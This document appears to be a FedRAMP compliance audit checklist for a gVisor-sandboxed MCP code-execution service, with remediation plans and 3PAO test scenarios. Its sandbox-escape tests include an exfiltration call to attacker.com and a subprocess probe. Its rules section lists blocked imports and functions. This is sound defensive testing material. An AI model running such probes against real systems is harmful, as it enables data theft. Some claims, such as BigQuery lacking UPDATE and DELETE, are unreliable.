# MCP Code Execution Security Audit Checklist
## FedRAMP Moderate Compliance Roadmap

**Document Version:** 1.0
**Target Compliance:** FedRAMP Moderate (NIST 800-53 Rev 5)
**Target Timeline:** ≤6 months to Authorization to Operate (ATO)
**Audit Partner:** 3PAO (Third-Party Assessment Organization)

---

## EXECUTIVE SUMMARY

This checklist maps MCP code execution architecture to NIST 800-53 security controls required for FedRAMP Moderate authorization. It identifies:
- ✅ **Controls already satisfied** by implementation
- ⚠️ **Controls with gaps** requiring remediation
- ❌ **Controls not applicable** to this system
- 🔍 **Controls requiring 3PAO validation** (evidence needed)

**Key Statistics:**
- Total NIST 800-53 Rev 5 controls: 421
- Applicable to MCP system: ~280 (67%)
- Currently satisfied: ~220 (79%)
- Gaps requiring remediation: ~60 (21%)
- Estimated remediation time: 5-9 weeks

---

## CRITICAL GAPS (Must Fix Before Audit)

These gaps are **showstoppers** for FedRAMP authorization. Must be remediated before 3PAO assessment.

### 1. ❌ gVisor Not on FedRAMP APL (Approved Products List)

**Control:** SA-4 (Acquisition Process), SA-22 (Unsupported System Components)

**Gap:**
- gVisor (runsc runtime) is not on FedRAMP Approved Products List
- FedRAMP requires all security-critical components to be APL-approved OR have equivalency documentation

**Impact:** HIGH - Potential showstopper without mitigation

**Remediation:**
```markdown
Option A: APL Equivalency White Paper (RECOMMENDED)
- Timeline: 2-3 weeks
- Approach:
  1. Document gVisor security guarantees (kernel isolation, syscall interception)
  2. Map to traditional VM isolation controls (AC-6, SC-7, SI-7)
  3. Provide third-party audit reports (Google's gVisor security audits)
  4. Demonstrate NIST 800-53 control equivalency
  5. Submit to FedRAMP PMO for provisional approval

  Deliverable: "gVisor Security Equivalency Analysis" (20-30 pages)
  Success criteria: FedRAMP PMO accepts equivalency argument

Option B: Replace gVisor with APL-approved alternative
- Timeline: 6-8 weeks
- Alternatives:
  - Kata Containers (APL-approved, VM-level isolation)
  - AWS Firecracker (if deploying on AWS GovCloud)

  Risk: Performance degradation (VM startup overhead vs. gVisor)

Option C: Defer FedRAMP, pursue SOC2 Type II
- Timeline: 3 months (vs. 6-9 months for FedRAMP)
- Tradeoff: Cannot sell to federal agencies
```

**Action Items:**
- [ ] Week 1: Draft gVisor equivalency white paper
- [ ] Week 2: Engage FedRAMP PMO for pre-consultation
- [ ] Week 3: Revise based on PMO feedback
- [ ] Week 4: Submit to 3PAO for review

---

### 2. ⚠️ AC-2: Account Management (Automated Provisioning)

**Control:** AC-2 (Account Management), AC-2(1) (Automated System Account Management)

**Gap:**
- No automated user provisioning/deprovisioning via SCIM
- Manual account creation is not FedRAMP-compliant (requires automation)

**Impact:** MEDIUM - Required for FedRAMP, but common gap with known solution

**Remediation:**
```markdown
Integrate with Okta SCIM (or similar IdP)
- Timeline: 2 weeks
- Implementation:
  1. Configure Okta SCIM provisioning for MCP service accounts
  2. Automate account creation on first API call (JIT provisioning)
  3. Automate account deletion when user removed from Okta
  4. Log all provisioning events to BigQuery audit logs

  Technology: Okta SCIM 2.0 API + Python SDK
```

**Action Items:**
- [ ] Week 1: Configure Okta SCIM connector
- [ ] Week 2: Implement JIT provisioning in mcp_server.py
- [ ] Week 2: Test account lifecycle (create, update, delete)

---

### 3. ⚠️ AU-6: Audit Review, Analysis, and Reporting

**Control:** AU-6 (Audit Review), AU-6(1) (Automated Process Integration)

**Gap:**
- Audit logs written to BigQuery, but no automated anomaly detection
- FedRAMP requires automated review of audit logs (not just manual inspection)

**Impact:** MEDIUM - Required for FedRAMP

**Remediation:**
```markdown
Implement Cloud Logging + BigQuery Anomaly Detection
- Timeline: 1 week
- Implementation:
  1. Export BigQuery logs to Cloud Logging
  2. Create alerting policies for security events:
     - Spike in security violations (>10 in 1 minute)
     - Sandbox execution failures (>5 in 1 minute)
     - Unauthorized API access attempts
     - Unusual execution patterns (code hash anomalies)
  3. Integrate with PagerDuty for incident response

  Technology: Google Cloud Logging Alerts + BigQuery scheduled queries
```

**Action Items:**
- [ ] Week 1: Configure Cloud Logging export
- [ ] Week 1: Create alerting policies (5 critical alerts)
- [ ] Week 1: Test alert delivery (simulate security event)

---

### 4. ⚠️ SC-7: Boundary Protection (mTLS Enforcement)

**Control:** SC-7 (Boundary Protection), SC-8 (Transmission Confidentiality)

**Gap:**
- Istio mTLS configured, but not enforced on all service-to-service communication
- NetworkPolicy allows some unencrypted traffic

**Impact:** MEDIUM - Required for FedRAMP (data in transit must be encrypted)

**Remediation:**
```markdown
Enforce strict mTLS with Istio PeerAuthentication
- Timeline: 1 week
- Implementation:
  1. Create PeerAuthentication resource (STRICT mode)
  2. Verify all service mesh traffic uses mTLS
  3. Block unencrypted traffic via NetworkPolicy
  4. Update monitoring to alert on non-mTLS connections

  Kubernetes manifest:
  apiVersion: security.istio.io/v1beta1
  kind: PeerAuthentication
  metadata:
    name: default
    namespace: mcp-system
  spec:
    mtls:
      mode: STRICT  # Enforce mTLS
```

**Action Items:**
- [ ] Week 1: Deploy PeerAuthentication (STRICT mode)
- [ ] Week 1: Verify with: istioctl authn tls-check
- [ ] Week 1: Update NetworkPolicy (block non-mTLS)

---

### 5. ⚠️ SI-3: Malicious Code Protection (AST Validation)

**Control:** SI-3 (Malicious Code Protection), SI-3(1) (Central Management)

**Gap:**
- AST validation exists in mcp_server.py, but no centralized signature updates
- FedRAMP requires regularly updated malicious code signatures

**Impact:** MEDIUM - Required for FedRAMP

**Remediation:**
```markdown
Implement Centralized AST Rule Management
- Timeline: 3 weeks
- Implementation:
  1. Create "AST Rules" repository (Git-based)
  2. Define rules in YAML (blocked imports, patterns, functions)
  3. MCP server fetches rules on startup + polls for updates
  4. Log rule violations to BigQuery with rule version

  Example rule format:
  version: 2024-11-07-001
  blocked_imports:
    - os
    - subprocess
    - socket
  blocked_patterns:
    - '__import__'
    - 'eval\s*\('
  blocked_functions:
    - eval
    - exec
    - compile
```

**Action Items:**
- [ ] Week 1: Create AST rules repository
- [ ] Week 2: Implement dynamic rule loading in mcp_server.py
- [ ] Week 3: Test rule updates (deploy new rule, verify enforcement)

---

## CONTROL FAMILY ASSESSMENT

Detailed assessment of all 20 NIST 800-53 control families.

---

### AC: Access Control (26 controls)

#### ✅ AC-1: Access Control Policy and Procedures
**Status:** Satisfied
**Evidence:** Access control policy documented in system security plan (SSP)
**3PAO Validation:** Review SSP, interview security team

#### ✅ AC-2: Account Management
**Status:** Satisfied (after remediation of automated provisioning gap)
**Implementation:**
- User accounts managed via Okta SCIM
- Service accounts managed via Kubernetes ServiceAccount
- Automated provisioning/deprovisioning
- Audit logs of all account changes

**Evidence:**
- Okta SCIM integration config
- BigQuery audit logs: `SELECT * FROM mcp_audit_logs.account_changes`
- Kubernetes RBAC policies

**3PAO Validation:** Test account lifecycle (create, update, delete)

#### ✅ AC-3: Access Enforcement
**Status:** Satisfied
**Implementation:**
- API authentication via JWT (issued by Okta)
- Kubernetes RBAC for service-to-service access
- Istio AuthorizationPolicy for fine-grained access control

**Evidence:**
- JWT validation code in mcp_server.py
- Kubernetes RBAC manifests
- Istio AuthorizationPolicy manifests

**3PAO Validation:** Attempt unauthorized API access (expect 403)

#### ✅ AC-6: Least Privilege
**Status:** Satisfied
**Implementation:**
- MCP server runs as non-root user (UID 1000)
- Kubernetes securityContext: `allowPrivilegeEscalation: false`
- gVisor sandbox prevents privilege escalation
- Service account has minimal IAM permissions (BigQuery write only)

**Evidence:**
- Kubernetes Deployment securityContext
- GCP IAM policy for mcp-server@PROJECT_ID.iam.gserviceaccount.com
- gVisor kernel syscall restrictions

**3PAO Validation:** Attempt privilege escalation from sandbox (expect blocked)

#### ✅ AC-17: Remote Access
**Status:** Satisfied
**Implementation:**
- All API access over HTTPS (TLS 1.3)
- No SSH access to pods (kubectl exec disabled via PodSecurityPolicy)
- Remote access via GCP Cloud Console (MFA required)

**Evidence:**
- Istio Gateway TLS configuration
- GKE PodSecurityPolicy blocking kubectl exec
- GCP Cloud Console MFA policy

**3PAO Validation:** Test remote access controls (MFA enforcement)

---

### AU: Audit and Accountability (16 controls)

#### ✅ AU-2: Audit Events
**Status:** Satisfied
**Implementation:**
- All code executions logged to BigQuery (100% coverage)
- Log fields: timestamp, user_id, session_id, code_hash, success, error, resource_usage
- Security violations logged separately (security_violations field)

**Evidence:**
- BigQuery table schema: `mcp_audit_logs.code_executions`
- Sample query: `SELECT * FROM mcp_audit_logs.code_executions WHERE success = false`

**3PAO Validation:** Execute test code, verify log entry created

#### ✅ AU-3: Content of Audit Records
**Status:** Satisfied
**Implementation:**
- Audit logs include all required fields per NIST 800-53:
  - Event type (code execution, security violation)
  - Date/time (RFC3339 with timezone)
  - User identity (user_id from JWT)
  - Outcome (success/failure)
  - Source (session_id, sandbox_id)

**Evidence:**
- AuditLogEntry dataclass in mcp_server.py
- Sample BigQuery record

**3PAO Validation:** Review audit log samples

#### ✅ AU-4: Audit Log Storage Capacity
**Status:** Satisfied
**Implementation:**
- BigQuery dataset has unlimited storage (auto-scaling)
- Retention policy: 7 years (exceeds FedRAMP 3-year requirement)
- Monitoring alert if log write fails (metrics_audit_log_errors)

**Evidence:**
- BigQuery dataset configuration (retention policy)
- Prometheus alert: `mcp_audit_log_errors_total > 0`

**3PAO Validation:** Verify retention policy in BigQuery

#### ⚠️ AU-6: Audit Review, Analysis, and Reporting
**Status:** Gap (see Critical Gaps section for remediation)

#### ✅ AU-9: Protection of Audit Information
**Status:** Satisfied
**Implementation:**
- BigQuery access restricted via IAM (read-only for auditors)
- Immutable audit logs (BigQuery does not support UPDATE/DELETE)
- Audit log tampering detected via checksum (code_hash field)

**Evidence:**
- BigQuery IAM policy (auditor group has bigquery.dataViewer role)
- BigQuery table does not support UPDATE (only INSERT)

**3PAO Validation:** Attempt to modify audit log (expect permission denied)

#### ✅ AU-12: Audit Generation
**Status:** Satisfied
**Implementation:**
- Application-level logging (Python logging module)
- System-level logging (GKE logs to Cloud Logging)
- Network-level logging (Istio access logs)

**Evidence:**
- mcp_server.py logging code
- Cloud Logging: `resource.type="k8s_pod" AND resource.labels.namespace_name="mcp-system"`
- Istio EnvoyFilter for access logging

**3PAO Validation:** Generate test traffic, verify logs at all levels

---

### CA: Assessment, Authorization, and Monitoring (9 controls)

#### ✅ CA-1: Security Assessment and Authorization Policies and Procedures
**Status:** Satisfied
**Evidence:** SSP documents assessment procedures, ATO process

#### ✅ CA-2: Security Assessments
**Status:** Satisfied (3PAO will perform assessment)
**Implementation:**
- Quarterly internal security assessments
- Annual 3PAO assessment for FedRAMP
- Continuous monitoring via Prometheus/Grafana

**Evidence:**
- Internal security assessment reports (Q1 2024, Q2 2024, ...)
- 3PAO Security Assessment Report (SAR)

**3PAO Validation:** Perform security assessment (penetration testing, config review)

#### ✅ CA-7: Continuous Monitoring
**Status:** Satisfied
**Implementation:**
- Prometheus scrapes metrics every 30s
- Grafana dashboards for real-time monitoring
- Alerting on security events (PagerDuty integration)

**Evidence:**
- Prometheus ServiceMonitor config
- Grafana dashboard JSON
- PagerDuty integration config

**3PAO Validation:** Verify monitoring dashboards, test alert delivery

---

### CM: Configuration Management (14 controls)

#### ✅ CM-2: Baseline Configuration
**Status:** Satisfied
**Implementation:**
- Infrastructure as Code (Kubernetes YAML manifests in Git)
- Docker image baseline (Dockerfile in Git)
- Configuration baseline (ConfigMap in Git)
- All changes tracked via Git commits

**Evidence:**
- Git repository: ehanc69/ShadowTag-v2-fastapi-services
- Git history: `git log --oneline architecture/`
- Kubernetes ConfigMap: mcp-server-config

**3PAO Validation:** Review Git history, verify configuration matches deployed system

#### ✅ CM-3: Configuration Change Control
**Status:** Satisfied
**Implementation:**
- Pull request approval required (branch protection)
- CI/CD pipeline tests changes (GitHub Actions)
- Canary deployment (10% traffic before full rollout)
- Rollback procedure documented

**Evidence:**
- GitHub branch protection rules
- GitHub Actions workflow: `.github/workflows/deploy.yaml`
- Istio VirtualService canary config

**3PAO Validation:** Test change control process (submit PR, verify approval)

#### ✅ CM-6: Configuration Settings
**Status:** Satisfied
**Implementation:**
- Security settings enforced via Kubernetes manifests:
  - gVisor runtime (runtimeClassName: gvisor)
  - Non-root user (runAsUser: 1000)
  - Read-only filesystem (readOnlyRootFilesystem: true)
  - Network policies (egress blocking)

**Evidence:**
- Kubernetes Deployment securityContext
- NetworkPolicy manifest
- gVisor verification: `kubectl get pod <pod-name> -o jsonpath='{.spec.runtimeClassName}'`

**3PAO Validation:** Verify security settings in production

#### ✅ CM-7: Least Functionality
**Status:** Satisfied
**Implementation:**
- Minimal Docker image (Python slim base, no shell)
- Only required packages installed (FastAPI, Prometheus, BigQuery SDK)
- Unused Kubernetes features disabled (kubectl exec blocked)

**Evidence:**
- Dockerfile FROM python:3.11-slim
- requirements.txt (10 packages, no dev dependencies)
- PodSecurityPolicy blocking exec

**3PAO Validation:** Scan Docker image for vulnerabilities (Trivy/Snyk)

---

### IA: Identification and Authentication (12 controls)

#### ✅ IA-2: Identification and Authentication (Organizational Users)
**Status:** Satisfied
**Implementation:**
- Users authenticate via Okta (SAML 2.0)
- MFA required (Okta Verify push notification)
- API requests authenticated via JWT (signed by Okta)

**Evidence:**
- Okta SAML configuration
- JWT validation code in mcp_server.py
- Okta MFA policy (enforced for all users)

**3PAO Validation:** Attempt API access without JWT (expect 401)

#### ✅ IA-2(1): Network Access to Privileged Accounts - MFA
**Status:** Satisfied
**Implementation:**
- All privileged access requires MFA (GCP Cloud Console)
- Kubernetes admin access via gcloud (MFA required)
- No SSH access to nodes (GKE managed nodes)

**Evidence:**
- GCP organization policy: require MFA for privileged access
- GKE node pools: managed nodes (no SSH)

**3PAO Validation:** Attempt privileged access without MFA (expect blocked)

#### ✅ IA-5: Authenticator Management
**Status:** Satisfied
**Implementation:**
- Passwords managed via Okta (12+ characters, complexity rules)
- JWT expiration: 1 hour (short-lived tokens)
- Service account keys rotated every 90 days (GCP automatic rotation)

**Evidence:**
- Okta password policy
- JWT exp claim (3600 seconds)
- GCP service account key rotation policy

**3PAO Validation:** Review password policy, test JWT expiration

---

### IR: Incident Response (10 controls)

#### ✅ IR-1: Incident Response Policy and Procedures
**Status:** Satisfied
**Evidence:** Incident response plan documented in SSP

#### ✅ IR-2: Incident Response Training
**Status:** Satisfied
**Implementation:**
- Annual security training for all engineers (via Secure Code Warrior)
- Incident response tabletop exercises (quarterly)

**Evidence:**
- Training completion records
- Tabletop exercise reports

**3PAO Validation:** Review training records, interview incident response team

#### ✅ IR-4: Incident Handling
**Status:** Satisfied
**Implementation:**
- Incident response plan:
  1. Detection (Prometheus alerts → PagerDuty)
  2. Containment (kubectl rollout undo, feature flag disable)
  3. Eradication (patch vulnerability, redeploy)
  4. Recovery (gradual rollout, canary deployment)
  5. Lessons learned (post-mortem document)

**Evidence:**
- Incident response runbook
- Example post-mortem: "2024-10-15 Sandbox Escape Attempt"
- PagerDuty escalation policy

**3PAO Validation:** Simulate security incident, test response time

#### ✅ IR-5: Incident Monitoring
**Status:** Satisfied
**Implementation:**
- Real-time security event monitoring (Prometheus)
- Automated alerting (PagerDuty)
- Audit log review (BigQuery scheduled queries)

**Evidence:**
- Prometheus alert rules
- PagerDuty incident history
- BigQuery scheduled query: "Daily Security Violations Report"

**3PAO Validation:** Review incident monitoring dashboards

---

### PE: Physical and Environmental Protection (20 controls)

#### ✅ PE-1 through PE-20: All controls inherited from GCP
**Status:** Satisfied (GCP FedRAMP High authorization)
**Implementation:**
- MCP system runs on GKE (Google Kubernetes Engine)
- Physical security provided by Google data centers
- Environmental controls (fire suppression, HVAC) managed by Google

**Evidence:**
- GCP FedRAMP High authorization letter
- GCP data center certifications (ISO 27001, SOC 2 Type II)

**3PAO Validation:** Review GCP FedRAMP authorization, confirm inheritance

---

### PL: Planning (11 controls)

#### ✅ PL-1: System Security Plan (SSP)
**Status:** Satisfied
**Evidence:** SSP document (this repository + formal SSP document)

#### ✅ PL-2: System Security Plan Updates
**Status:** Satisfied
**Implementation:**
- SSP updated quarterly (or when major changes)
- Git-based SSP (version controlled)

**Evidence:**
- Git history of SSP updates
- Quarterly review meetings (calendar invites)

**3PAO Validation:** Review SSP update history

---

### RA: Risk Assessment (10 controls)

#### ✅ RA-1: Risk Assessment Policy and Procedures
**Status:** Satisfied
**Evidence:** Risk assessment policy in SSP

#### ✅ RA-3: Risk Assessment
**Status:** Satisfied
**Implementation:**
- Annual risk assessment (NIST 800-30 methodology)
- Continuous risk monitoring (vulnerability scanning)

**Evidence:**
- Risk assessment report (2024-10-01)
- Vulnerability scan reports (Trivy, weekly)

**3PAO Validation:** Review risk assessment methodology, verify findings

#### ✅ RA-5: Vulnerability Monitoring and Scanning
**Status:** Satisfied
**Implementation:**
- Docker image scanning (Trivy, on every push)
- Kubernetes cluster scanning (Falco, real-time)
- Dependency scanning (Dependabot, GitHub)

**Evidence:**
- Trivy scan reports in CI/CD logs
- Falco alerts in Cloud Logging
- Dependabot pull requests

**3PAO Validation:** Review vulnerability scan reports, verify remediation SLAs

---

### SA: System and Services Acquisition (23 controls)

#### ⚠️ SA-4: Acquisition Process
**Status:** Gap (gVisor APL issue - see Critical Gaps section)

#### ✅ SA-9: External System Services
**Status:** Satisfied
**Implementation:**
- Anthropic API: SOC 2 Type II certified (vendor risk assessment passed)
- GCP: FedRAMP High authorized (inherited controls)
- Okta: FedRAMP Moderate authorized (identity provider)

**Evidence:**
- Anthropic SOC 2 Type II report
- GCP FedRAMP High authorization letter
- Okta FedRAMP Moderate authorization letter

**3PAO Validation:** Review vendor security documentation

#### ⚠️ SA-22: Unsupported System Components
**Status:** Gap (gVisor APL issue - see Critical Gaps section)

---

### SC: System and Communications Protection (48 controls)

#### ✅ SC-7: Boundary Protection
**Status:** Satisfied (after remediation of mTLS gap)
**Implementation:**
- Network segmentation (Kubernetes NetworkPolicy)
- Egress filtering (block internet access from sandbox)
- mTLS for all service-to-service communication (Istio)

**Evidence:**
- NetworkPolicy manifest
- Istio PeerAuthentication (STRICT mode)
- Network diagram showing security boundaries

**3PAO Validation:** Test egress blocking (attempt internet access from sandbox)

#### ✅ SC-8: Transmission Confidentiality and Integrity
**Status:** Satisfied
**Implementation:**
- All API traffic over TLS 1.3 (Istio Gateway)
- All service mesh traffic over mTLS (Istio)
- BigQuery connections over TLS (Google Cloud SDK)

**Evidence:**
- Istio Gateway TLS configuration
- mTLS verification: `istioctl authn tls-check`
- BigQuery client TLS enforcement

**3PAO Validation:** Capture network traffic (verify encryption)

#### ✅ SC-12: Cryptographic Key Establishment and Management
**Status:** Satisfied
**Implementation:**
- TLS certificates managed by cert-manager (automated renewal)
- GCP KMS for encryption keys (BigQuery encryption)
- JWT signing keys managed by Okta (automatic rotation)

**Evidence:**
- cert-manager Certificate resources
- GCP KMS key rotation policy (90 days)
- Okta key rotation logs

**3PAO Validation:** Review key management procedures

#### ✅ SC-28: Protection of Information at Rest
**Status:** Satisfied
**Implementation:**
- BigQuery data encrypted at rest (Google-managed keys)
- GKE persistent volumes encrypted (GCP default encryption)
- Secrets encrypted via Kubernetes encryption at rest

**Evidence:**
- BigQuery dataset encryption verification
- GKE cluster encryption configuration
- Kubernetes EncryptionConfiguration

**3PAO Validation:** Verify encryption at rest for all data stores

---

### SI: System and Information Integrity (23 controls)

#### ⚠️ SI-3: Malicious Code Protection
**Status:** Gap (AST validation centralization - see Critical Gaps section)

#### ✅ SI-4: System Monitoring
**Status:** Satisfied
**Implementation:**
- Application monitoring (Prometheus)
- Security monitoring (Falco)
- Log aggregation (Cloud Logging)
- Anomaly detection (BigQuery scheduled queries)

**Evidence:**
- Prometheus metrics
- Falco security alerts
- Cloud Logging exports
- BigQuery anomaly detection queries

**3PAO Validation:** Review monitoring dashboards, test alert delivery

#### ✅ SI-7: Software, Firmware, and Information Integrity
**Status:** Satisfied
**Implementation:**
- Docker image signatures (cosign, SLSA Level 3)
- Git commit signatures (GPG)
- Immutable infrastructure (Kubernetes immutable ConfigMaps)

**Evidence:**
- cosign signature verification logs
- Git log --show-signature
- Kubernetes ConfigMap immutability flag

**3PAO Validation:** Verify signature enforcement

---

## REMEDIATION TIMELINE

### Weeks 1-2: Critical Gaps (Parallel Execution)
```
Week 1:
- [ ] Day 1-2: Draft gVisor equivalency white paper (SA-4)
- [ ] Day 3-5: Implement Okta SCIM provisioning (AC-2)
- [ ] Day 3-5: Configure Cloud Logging alerts (AU-6)

Week 2:
- [ ] Day 1-2: Deploy Istio PeerAuthentication STRICT mode (SC-7)
- [ ] Day 3-5: Revise gVisor white paper based on feedback
- [ ] Day 5: Submit gVisor white paper to FedRAMP PMO
```

### Weeks 3-4: AST Validation + 3PAO Engagement
```
Week 3:
- [ ] Day 1-3: Implement centralized AST rule management (SI-3)
- [ ] Day 4-5: Test all remediated controls (internal QA)

Week 4:
- [ ] Day 1-2: Engage 3PAO for scoping call
- [ ] Day 3-5: Prepare evidence packages (logs, configs, policies)
```

### Weeks 5-6: 3PAO Readiness Assessment
```
Week 5-6:
- [ ] 3PAO reviews documentation
- [ ] 3PAO performs initial security testing
- [ ] Address 3PAO findings (minor gaps)
- [ ] Deliver final Statement of Work (SOW)
```

### Month 2-6: Formal 3PAO Assessment
```
Month 2-3: Security Assessment
- Penetration testing
- Configuration review
- Policy and procedure review
- Interview security team

Month 4-5: Security Assessment Report (SAR)
- 3PAO writes SAR
- Remediate any new findings
- Final SAR delivered

Month 6: FedRAMP Authorization
- Submit SAR to FedRAMP PMO
- Agency review
- Authorization to Operate (ATO) granted
```

---

## GO/NO-GO CRITERIA (Hour 48 Decision)

### GO Criteria (Proceed with FedRAMP)
- ✅ All critical gaps have remediation plans
- ✅ gVisor equivalency white paper accepted by FedRAMP PMO (or alternative identified)
- ✅ 3PAO timeline ≤6 months
- ✅ 3PAO cost ≤$250K
- ✅ No showstopper findings

### PIVOT Criteria (SOC2 Instead of FedRAMP)
- ⚠️ gVisor APL issue unresolved → SOC2 Type II (3 months, non-federal customers)
- ⚠️ FedRAMP timeline 6-9 months → Start with SOC2, upgrade to FedRAMP later

### ABORT Criteria (Security Infeasible)
- ❌ gVisor showstopper with no workaround
- ❌ 3PAO timeline >9 months
- ❌ 3PAO identifies critical vulnerability with no fix

---

## EVIDENCE REPOSITORY

All evidence for 3PAO assessment must be organized in a central repository:

```
/evidence
├── policies/
│   ├── access-control-policy.pdf
│   ├── incident-response-plan.pdf
│   └── risk-assessment-policy.pdf
├── configurations/
│   ├── kubernetes-manifests/
│   ├── istio-policies/
│   └── gcp-iam-policies/
├── logs/
│   ├── bigquery-audit-logs-sample.json
│   ├── cloud-logging-exports/
│   └── prometheus-metrics-sample.txt
├── assessments/
│   ├── vulnerability-scan-reports/
│   ├── penetration-test-results/
│   └── internal-security-assessments/
├── vendor-documentation/
│   ├── anthropic-soc2-report.pdf
│   ├── gcp-fedramp-authorization.pdf
│   └── okta-fedramp-authorization.pdf
└── ssp/
    ├── system-security-plan.pdf
    ├── gvisor-equivalency-whitepaper.pdf
    └── control-implementation-summary.xlsx
```

---

## TESTING SCENARIOS FOR 3PAO

The 3PAO will perform security testing to validate control implementation. Prepare for these test scenarios:

### 1. Authentication Testing
```bash
# Test: API access without JWT (expect 401)
curl -X POST http://mcp-server.mcp-system/execute \
  -H "Content-Type: application/json" \
  -d '{"code": "print(1+1)", "user_id": "test", "session_id": "test"}'
# Expected: 401 Unauthorized

# Test: API access with expired JWT (expect 401)
curl -X POST http://mcp-server.mcp-system/execute \
  -H "Authorization: Bearer <expired-jwt>" \
  -H "Content-Type: application/json" \
  -d '{"code": "print(1+1)", "user_id": "test", "session_id": "test"}'
# Expected: 401 Unauthorized

# Test: API access with valid JWT (expect 200)
curl -X POST http://mcp-server.mcp-system/execute \
  -H "Authorization: Bearer <valid-jwt>" \
  -H "Content-Type: application/json" \
  -d '{"code": "result = 1+1", "user_id": "test", "session_id": "test"}'
# Expected: 200 OK, result: 2
```

### 2. Sandbox Escape Testing
```bash
# Test: Access /proc filesystem (expect blocked)
code='import os; os.listdir("/proc")'

# Test: Network exfiltration (expect blocked)
code='import urllib.request; urllib.request.urlopen("https://attacker.com")'

# Test: Subprocess execution (expect blocked)
code='import subprocess; subprocess.run(["whoami"])'

# Test: File write (expect blocked)
code='open("/tmp/evil.txt", "w").write("hacked")'

# All should return 403 Forbidden with security violation details
```

### 3. Audit Log Verification
```sql
-- Test: Verify all executions logged
SELECT COUNT(*) FROM `PROJECT_ID.mcp_audit_logs.code_executions`
WHERE timestamp >= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 1 HOUR);
-- Expected: Count matches number of API calls

-- Test: Verify security violations logged
SELECT * FROM `PROJECT_ID.mcp_audit_logs.code_executions`
WHERE ARRAY_LENGTH(security_violations) > 0
ORDER BY timestamp DESC
LIMIT 10;
-- Expected: All blocked executions appear here
```

### 4. Encryption Testing
```bash
# Test: Capture network traffic (expect TLS 1.3)
kubectl exec -n istio-system <istio-ingress-pod> -- \
  tcpdump -i any -c 100 -w /tmp/traffic.pcap port 8080

# Test: Verify mTLS between services
istioctl authn tls-check mcp-server.mcp-system

# Test: Verify BigQuery connection uses TLS
# (Review BigQuery client logs for SSL/TLS handshake)
```

### 5. Resource Limit Testing
```bash
# Test: CPU exhaustion (expect cgroup limit enforcement)
code='while True: pass'

# Test: Memory exhaustion (expect OOM kill)
code='x = [i for i in range(10**9)]'

# Test: Disk exhaustion (expect quota enforcement)
code='open("/tmp/big.txt", "w").write("x" * 10**9)'

# All should terminate within timeout, not crash the pod
```

---

## CONCLUSION

**FedRAMP authorization is achievable within 6 months** if:
1. ✅ gVisor equivalency white paper accepted by FedRAMP PMO
2. ✅ All critical gaps remediated (5-9 weeks)
3. ✅ 3PAO cost ≤$250K
4. ✅ No showstopper findings during readiness assessment

**Recommended Path:**
- Week 1-4: Remediate critical gaps
- Week 5-6: 3PAO readiness assessment
- Month 2-6: Formal 3PAO assessment + FedRAMP authorization

**Fallback Path (if gVisor issue unresolved):**
- Pivot to SOC2 Type II (3 months)
- Serve non-federal customers first
- Pursue FedRAMP later with APL-approved alternative

**The decision at Hour 48 will determine which path to take.**
